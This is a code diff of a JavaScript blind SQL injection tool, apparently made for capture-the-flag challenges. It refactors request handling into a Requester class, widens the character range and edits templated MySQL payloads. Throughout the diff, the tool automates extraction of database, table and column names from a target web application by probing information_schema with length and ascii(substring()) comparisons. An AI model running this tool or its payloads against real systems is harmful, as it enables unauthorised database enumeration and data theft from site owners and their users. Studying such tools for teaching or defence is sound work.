@@ -1,26 +1,7 @@
 const Mustache = require('mustache');
+const Requester = require('./requester');
 
 Mustache.escape = text => text;
-
-const blindPost = async (url, params) => {
-    const timeout = 1;
-    const start = new Date();
-
-    const response = await fetch(url, {
-        method: 'POST',
-        body: params
-    });
-
-    const elapsed = new Date() - start;
-    const html = await response.text();
-
-    if (html.includes('Wrong.')) {
-        throw new Error('SQL error');
-    }
-
-    return elapsed > timeout * 1000;
-};
-
 
 class SQLi {
     constructor(options) {
@@ -28,12 +9,21 @@ class SQLi {
         this.db = options.db;
         this.url = options.url;
         this.data = options.data;
-        this.type = options.type;
         this.query = options.query;
         this.table = options.table;
         this.column = options.column;
         this.method = options.method;
         this.timeout = options.timeout;
+        this.condition = options.condition;
+        this.requester = new Requester(
+            options.url,
+            options.method,
+            options.condition
+        );
+    }
+
+    request(data) {
+        return this.requester.request(this.url, this.method, data, this.condition);
     }
 
     async iterate(query, params, numbers = [...Array(100).keys()]) {
@@ -47,13 +37,11 @@ class SQLi {
                 db: this.db,
                 number,
                 ...params
-            }, {
-                query
-            });
+            }, { query });
 
             console.log(payload);
             const data = new URLSearchParams(payload);
-            const match = await blindPost(this.url, data);
+            const match = await this.request(data);
 
             if (match) {
                 target = number;
@@ -83,6 +71,7 @@ class SQLi {
             );
 
             objectNameChars.push(String.fromCharCode(code));
+            console.log(objectNameChars);
         }
 
         const objectName = objectNameChars.join('');
@@ -90,14 +79,12 @@ class SQLi {
         return objectName;
     }
 
-    static CHAR_CODES = [...Array(10).keys()].map(i => i + 48)
-        .concat([...Array(31).keys()].map(i => i + 95))
-        .concat(['{'.charCodeAt(0), '}'.charCodeAt(0), '-'.charCodeAt(0)]);
+    static CHAR_CODES = [...Array(150).keys()].map(x => x + 32);
 
     static async dumpDbNames(options) {
         const sqli = new SQLi(options);
         const databasesCount = await sqli.iterate(
-            "(SELECT count(DISTINCT(schema_name)) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') ORDER BY schema_name)={{number}}"
+            "(SELECT count(DISTINCT(schema_name)) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql'))={{number}}"
         );
 
         if (databasesCount === 0) {
@@ -147,7 +134,7 @@ class SQLi {
     static async dumpColumnNames(options) {
         const sqli = new SQLi(options);
         const columnsCount = await sqli.iterate(
-            "(SELECT count(DISTINCT(column_name)) FROM information_schema.columns WHERE table_schema='{{db}}' AND table_name='{{table}}')={{number}}"
+            "(SELECT count(DISTINCT(column_name)) FROM information_schema.columns WHERE table_name='{{table}}')={{number}}"
         );
 
         if (columnsCount === 0) {
@@ -159,8 +146,8 @@ class SQLi {
 
         for (let rowIndex = 0; rowIndex < columnsCount; rowIndex += 1) {
             const columnName = await sqli.getObjectName(
-                "length((SELECT DISTINCT column_name FROM information_schema.columns WHERE table_schema='{{db}}' AND table_name='{{table}}' LIMIT {{rowIndex}},1))={{number}}",
-                "ascii(substring((SELECT DISTINCT column_name FROM information_schema.columns WHERE table_schema='{{db}}' AND table_name='{{table}}' LIMIT {{rowIndex}},1),{{charIndex}},1))={{number}}",
+                "length((SELECT DISTINCT column_name FROM information_schema.columns WHERE table_name='{{table}}' LIMIT {{rowIndex}},1))={{number}}",
+                "ascii(substring((SELECT DISTINCT column_name FROM information_schema.columns WHERE table_name='{{table}}' LIMIT {{rowIndex}},1),{{charIndex}},1))={{number}}",
                 rowIndex
             );
             columnNames.push(columnName);
